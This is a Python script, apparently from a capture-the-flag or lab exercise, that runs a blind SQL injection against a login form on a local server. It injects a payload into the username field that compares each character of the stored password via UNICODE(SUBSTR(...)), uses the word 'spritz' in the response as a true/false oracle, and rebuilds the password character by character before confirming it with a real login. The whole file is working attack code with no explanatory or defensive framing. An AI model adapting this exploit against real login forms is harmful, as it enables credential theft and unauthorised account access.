import requests
import string
import time

url = "http://127.0.0.1:5000"
alphabet = list(string.printable)

def check_login(password):
	data = {
		"username": "029ee67de769468bf1596fb3fcef8179",
		"password": password
	}

	response = requests.post(url, data=data)

	return "spritz" in response.text

start_time = time.time()

password = ''
iter = 1
while iter <= 100:
	for i, a in enumerate(alphabet):
		data = {
			"username": f"029ee67de769468bf1596fb3fcef8179' AND UNICODE(SUBSTR(password, {iter}, 1)) = {ord(a)}--",
			"password": "1"
		}

		response = requests.post(url, data=data)

		if "spritz" in response.text:
			print(f"Step {i}: {a}\n{response.text}", flush=True)
			password += a
			break
	
	if check_login(password):
		break
		
	iter += 1

print(f"Password: {password}")

end_time = time.time()
execution_time = end_time - start_time
print(f"Execution time: {execution_time} seconds")

